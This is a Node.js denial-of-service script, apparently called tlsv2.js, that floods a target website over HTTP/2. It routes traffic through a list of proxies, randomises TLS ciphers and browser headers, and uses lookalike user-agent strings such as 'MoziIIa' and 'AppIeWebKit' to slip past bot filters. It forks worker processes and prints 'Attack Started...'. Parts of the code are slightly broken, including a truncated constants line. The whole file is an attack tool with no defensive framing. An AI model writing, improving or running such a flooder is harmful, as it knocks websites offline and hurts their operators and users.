const fs = require('fs');
const http = require('http');
const http2 = require('http2');
const tls = require('tls');
const crypto = require('crypto');
const url = require('url');
const cluster = require('cluster');

const EventEmitter = require('events');
const emitter = new EventEmitter();

process.setMaxListeners(0);
process.on('uncaughtException', function(error)  {  });
process.on('unhandledRejection', function(error) {  });

const [target, time, threads, requests, proxyfile] = process.argv.slice(2);
let errors = 0;


//Nxver shit backup version | this test.


if (process.argv.length < 4) {
    console.log('node tlsv2.js target time thread request proxytxt');
    process.exit(-1);
}

const proxies = fs.readFileSync(proxyfile, 'utf-8').toString().replace(/\r/g, '').split('\n').filter(word => word.trim().length > 0);
const parsed = url.parse(target);

const Versions = [
	'109.0.0.0',
	'108.0.0.0',
	'107.0.0.0',
	'106.0.0.0',
	'105.0.0.0',
	'104.0.0.0',
	'103.0.0.0',
	'102.0.0.0',
	'101.0.0.0',	
];

const Language = [
	'ko-KR', 'en-US', 'zh-CN', 'zh-TW', 
	'ja-JP', 'en-GB', 'en-AU', 'en-CA', 
	'en-NZ', 'en-ZA', 'en-IN', 'en-PH', 
	'en-SG', 'en-ZA', 'en-HK', 'en-US', 
	'*', 'en-US,en;q=0.5', 
	'utf-8, iso-8859-1;q=0.5, *;q=0.1', 
	'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5', 
	'en-GB, en-US, en;q=0.9', 'de-AT, de-DE;q=0.9, en;q=0.5', 
	'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7', 
	'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5', 
	'en-US,en;q=0.5', 'en-US,en;q=0.9', 'de-CH;q=0.7', 
	'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5', 
	'da, en-gb;q=0.8, en;q=0.7', 'cs;q=0.5'
];

const version = Versions[Math.floor(Math.random() * Versions.length)];

const sigalgs = ['ecdsa_secp256r1_sha256', 'ecdsa_secp384r1_sha384', 'ecdsa_secp521r1_sha512', 'rsa_pss_rsae_sha256', 'rsa_pss_rsae_sha384', 'rsa_pss_rsae_sha512', 'rsa_pkcs1_sha256', 'rsa_pkcs1_sha384', 'rsa_pkcs1_sha512'];
const cplist =  ["ECDHE-ECDSA-AES128-GCM-SHA256", "ECDHE-ECDSA-CHACHA20-POLY1305", "ECDHE-RSA-AES128-GCM-SHA256", "ECDHE-RSA-CHACHA20-POLY1305", "ECDHE-ECDSA-AES256-GCM-SHA384", "ECDHE-RSA-AES256-GCM-SHA384", "ECDHE-ECDSA-AES128-SHA256", "ECDHE-RSA-AES128-SHA256", "ECDHE-ECDSA-AES256-SHA384", "ECDHE-RSA-AES256-SHA384"];

let SignalsList = sigalgs.join(':');
this.curve = "GREASE:X25519:x25519";
this.sigalgs = SignalsList;
this.Opt = crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSLcom

function cipher_s() {
   return cplist[Math.floor(Math.random() * cplist.length)];
}

function random_string(length, type) {
	var string = "";
	var characters = "";
	if (type == "LN") {
		characters ="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
	} 
	else if (type == "L") {
		characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
	} 
	else if (type == "N") {
		characters = "0123456789";
	} 
	else {
		characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
	}

	var charactersLength = characters.length;

	for (var i = 0; i < length; i++) {
		string += characters.charAt(Math.floor(Math.random() * charactersLength));
	}

	return string;
}

function every_rand() {
	const headers = {
		':authority': parsed.host,
		':method': 'PRI',
		':path': parsed.path + random_string(5, "LТ"),
		':scheme': "https",
		"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
		"accept-language": Language[Math.floor(Math.random() * Language.length)],
		"sec-ch-ua": `"Edg";v="${version}", "Edg";v="${version}", "Not=A?Brand";v="9"`,
		"sec-ch-ua-mobile": "?" + random_string(2, "N"), 
		"sec-ch-ua-platform": `"Windows"`,
		"sec-fetch-dest": "document", 
		"sec-fetch-mode": "navigate", 
		"sec-fetch-site": "none", 
		"sec-fetch-user": "?1", 
		"upgrade-insecure-requests": "1", 
		"user-agent": `MoziIIa/5.0 (Windows NT 10.0; Win64; x64) AppIeWebKit/537.36 (KHTML, Iike Gecko) Chrome/${version} Safari/537.36`,
		"x-requested-with": "XMLHttpRequest",
		"pragma": "no-cache",
		"cache-control": "no-cache",
		"referer": 'https://' + parsed.host + parsed.path + random_string(15, "L"),
	};
	return headers;
}

function proxy_rand() {
	return proxies[Math.floor(Math.random() * proxies.length)];
}

function flooder() {
	var proxy = proxy_rand().split(':');
	const agent = new http.Agent({
	   keepAlive: false,
	   maxSockets: Infinity,
	   maxTotalSockets: Infinity,
	   maxSockets: Infinity
	});		
	
	const req = http["get"]({
		  method: 'CONNECT',
		  host: proxy[0],
		  port: proxy[1],
		  agent: agent,		  
		  path: parsed.host,
		  ciphers: cipher_s(),
		  timeout: 10000,
		  headers: {
			  "host": parsed.host,
			  "user-agent": `MoziIIa/5.0 (Windows NT 10.0; Win64; x64) AppIeWebKit/537.36 (KHTML, Iike Gecko) Chrome/${version} Safari/537.36`,
		  },
	});	
	
	req.on('connect', (err, info) => {		
		function attack(socket) {
			http2.connect(target, {
				createConnection: () => socket,
				settings: {
					headerTableSize: 65565,
					maxConcurrentStreams: 5000,
					initialWindowSize: 6291456,
					maxHeaderListSize: 262144,
					enablePush: false
				}
			}, (session) => {
				for(let i = 0; i < requests; i++) {				
					var request = session.request(every_rand());
					request.setEncoding('utf8');
					request.on('data', (chunk) => {});
					request.on("response", () => {
						request.close();
					})
					request.end();					
				}
			}).on('error', () => {
				errors++
				if(errors >= 5) { return; errors = 0; }
			})
		}
		const socket = tls.connect({
			rejectUnauthorized: false,
			host: parsed.host,
			servername: parsed.host,
			honorCipherOrder: false, 
			requestCert: true,
			socket: info,
			ciphers: cipher_s(),
			secure: true,
			gzip: true,
			echdCurve: this.curve,
			sigalgs: this.sigalgs,
			secureOptions: this.Opt,
			followAllRedirects: true,
			decodeEmails: false,			
			ALPNProtocols: ['h2'],			
		}, () => {
			for(let i = 0; i < 3; i++) {
				attack(socket);	
			}			
		})
	})
	req.end();
}

function main() {
	setInterval(flooder);	
}

if (cluster.isMaster){
	for (let i = 0; i < threads; i++){
		cluster.fork();
	}
	console.clear();
	console.log("Attack Started...")
} else {
	setInterval(main);
}
setTimeout(() => {
	console.log("Attack Stopped...")
	process.exit(-1);
}, time * 1000);
